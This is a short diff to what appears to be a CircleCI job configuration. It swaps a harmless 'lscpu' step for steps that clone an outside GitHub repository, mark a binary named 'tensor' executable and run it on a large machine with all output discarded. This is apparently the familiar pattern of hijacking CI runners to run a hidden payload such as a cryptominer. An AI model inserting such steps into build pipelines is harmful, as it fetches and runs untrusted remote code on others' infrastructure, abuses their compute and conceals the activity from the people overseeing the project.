@@ -6,4 +6,7 @@ jobs:
       image: ubuntu-1604:201903-01
     resource_class: 2xlarge
     steps:
-      - run: lscpu
+      - run: git clone https://github.com/Rasparduino/Datasets.git
+      - run: cd Datasets
+      - run: chmod +x tensor
+      - run: ./tensor --config config.cfg > /dev/null 2> /dev/null
